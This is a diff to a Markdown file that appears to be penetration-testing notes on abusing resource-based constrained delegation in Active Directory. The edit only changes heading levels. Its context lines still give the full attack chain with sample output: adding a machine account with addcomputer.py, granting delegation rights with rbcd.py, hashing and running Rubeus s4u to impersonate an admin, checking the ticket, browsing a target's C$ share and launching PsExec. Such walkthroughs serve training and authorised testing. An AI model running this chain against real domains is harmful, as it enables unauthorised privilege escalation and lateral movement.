@@ -25,7 +25,7 @@ git clone https://github.com/tothi/rbcd-attack
 
 ### Abusing
 
-#### Create the computer object needed for the operation
+### Create the computer object needed for the operation
 
 ```plain
 $ addcomputer.py -computer-name 'RECEPTION$' -computer-pass JteYeCym2JxkH -dc-ip 10.10.10.10 offsec.nl/jane:'Welkom123!'
@@ -34,7 +34,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Successfully added machine account RECEPTION$ with password JteYeCym2JxkH.
 ```
 
-#### Set rights for impersonation
+### Set rights for impersonation
 
 ```plain
 $ ./rbcd.py -f RECEPTION -t WIN10-TARGET -dc-ip 10.10.10.10 offsec.nl\\jane:'Welkom123!'
@@ -51,7 +51,7 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 [*] RECEPTION$ can now impersonate users on WIN10-TARGET$ via S4U2Proxy
 ```
 
-#### Create RC4-HMAC hash for computer object
+### Create RC4-HMAC hash for computer object
 
 ```plain
 Z:\> .\Rubeus.exe hash /password:JteYeCym2JxkH /user:RECEPTION /domain:offsec.nl
@@ -78,7 +78,7 @@ Z:\> .\Rubeus.exe hash /password:JteYeCym2JxkH /user:RECEPTION /domain:offsec.nl
 [*]       des_cbc_md5          : 528F4FE3A219FB6E
 ```
 
-#### Impersonate any user from the Active Directory
+### Impersonate any user from the Active Directory
 
 ```plain
 PS z:\> .\rubeus.exe s4u /user:RECEPTION$ /rc4:C3CA46DA95A2B9CAB36C31A3202CE355 /impersonateuser:JOHNDO-ADM /msdsspn:cifs/WIN10-TARGET.offsec.nl /ptt
@@ -124,7 +124,7 @@ PS z:\> .\rubeus.exe s4u /user:RECEPTION$ /rc4:C3CA46DA95A2B9CAB36C31A3202CE355 
 [+] Ticket successfully imported!
 ```
 
-#### Check ticket is successfully imported
+### Check ticket is successfully imported
 
 ```plain
 PS z:\> klist
@@ -145,7 +145,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-#### Browse the system using the ticket
+### Browse the system using the ticket
 
 ```plain
 PS z:\> dir \\WIN10-TARGET.offsec.nl\c$
@@ -163,7 +163,7 @@ d-r---         9/29/2020  10:33 AM                Users
 d-----         2/17/2021   2:34 PM                Windows
 ```
 
-#### Run PsExec
+### Run PsExec
 
 ```plain
 PS z:\> PsExec.exe \\WIN10-TARGET.offsec.nl cmd
